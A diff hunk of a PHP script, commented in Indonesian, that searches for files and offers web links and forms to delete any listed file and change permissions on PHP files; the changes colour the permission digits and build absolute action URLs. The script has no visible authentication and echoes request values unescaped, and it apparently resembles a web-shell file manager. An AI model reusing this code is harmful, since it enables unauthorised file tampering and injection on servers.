@@ -54,7 +54,7 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
         if (file_exists($fileToChmod) && is_file($fileToChmod) && pathinfo($fileToChmod, PATHINFO_EXTENSION) === 'php') {
             $newPermissions = octdec($_GET['permissions']);
             if (chmod($fileToChmod, $newPermissions)) {
-                echo "Permissions for '$fileToChmod' have been changed to $newPermissions.";
+                echo "Permissions for '$fileToChmod' have been changed to <span style='color: white;'>$newPermissions</span>.";
             } else {
                 echo "Failed to change permissions for '$fileToChmod'.";
             }
@@ -70,12 +70,20 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
         foreach ($hasilPencarian as $fileInfo) {
             $file = $fileInfo['path'];
             $permissions = $fileInfo['permissions'];
+
+            $deleteUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&delete=" . urlencode($file);
+            $chmodUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&chmod=" . urlencode($file);
+
+            echo "$file (Permissions: ";
+            // Tambahkan warna putih untuk root dan hijau untuk user pada angka izin
+            echo "<span style='color: white;'>" . substr($permissions, 0, 1) . "</span>";
+            echo "<span style='color: green;'>" . substr($permissions, 1) . "</span>) ";
             
-            echo "$file (Permissions: $permissions) ";
             // Tambahkan tautan untuk menghapus file yang sesuai
-            echo "<a href='?find=$kataCari&delete=" . urlencode($file) . "'>Hapus</a> ";
+            echo "<a href='$deleteUrl'>Hapus</a> ";
+            
             // Tambahkan form untuk mengubah izin file
-            echo "<form method='post' action='?find=$kataCari&chmod=" . urlencode($file) . "'>";
+            echo "<form method='post' action='$chmodUrl'>";
             echo "Ubah Permissions: <input type='text' name='permissions' placeholder='e.g., 0755' required> ";
             echo "<input type='submit' value='Ubah Permissions'>";
             echo "</form><br>";
